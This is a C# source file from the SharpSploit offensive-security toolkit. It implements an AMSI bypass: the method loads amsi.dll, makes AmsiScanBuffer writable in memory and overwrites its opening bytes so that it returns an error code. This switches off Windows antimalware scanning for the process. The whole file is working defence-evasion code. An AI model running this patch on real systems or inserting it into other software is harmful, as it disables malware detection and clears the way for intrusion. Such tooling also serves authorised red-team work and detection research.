// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Runtime.InteropServices;

using SharpSploit.Misc;
using PInvoke = SharpSploit.Execution.PlatformInvoke;

namespace SharpSploit.Evasion
{
    /// <summary>
    /// Amsi is a class for manipulating the Antimalware Scan Interface.
    /// </summary>
    public class Amsi
    {
        /// <summary>
        /// Patch the AmsiScanBuffer function in amsi.dll.
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <returns>Bool. True if succeeded, otherwise false.</returns>
        /// <remarks>
        /// Credit to Adam Chester (@_xpn_).
        /// </remarks>
        public static bool PatchAmsiScanBuffer()
        {
            byte[] patch;
            if (Utilities.Is64Bit)
            {
                patch = new byte[6];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc3;
            }
            else
            {
                patch = new byte[8];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc2;
                patch[6] = 0x18;
                patch[7] = 0x00;
            }

            try
            {
                var library = PInvoke.Win32.Kernel32.LoadLibrary("amsi.dll");
                var address = PInvoke.Win32.Kernel32.GetProcAddress(library, "AmsiScanBuffer");
                uint oldProtect;
                PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, address, patch.Length);
                PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Exception: " + e.Message);
                return false;
            }
        }
    }
}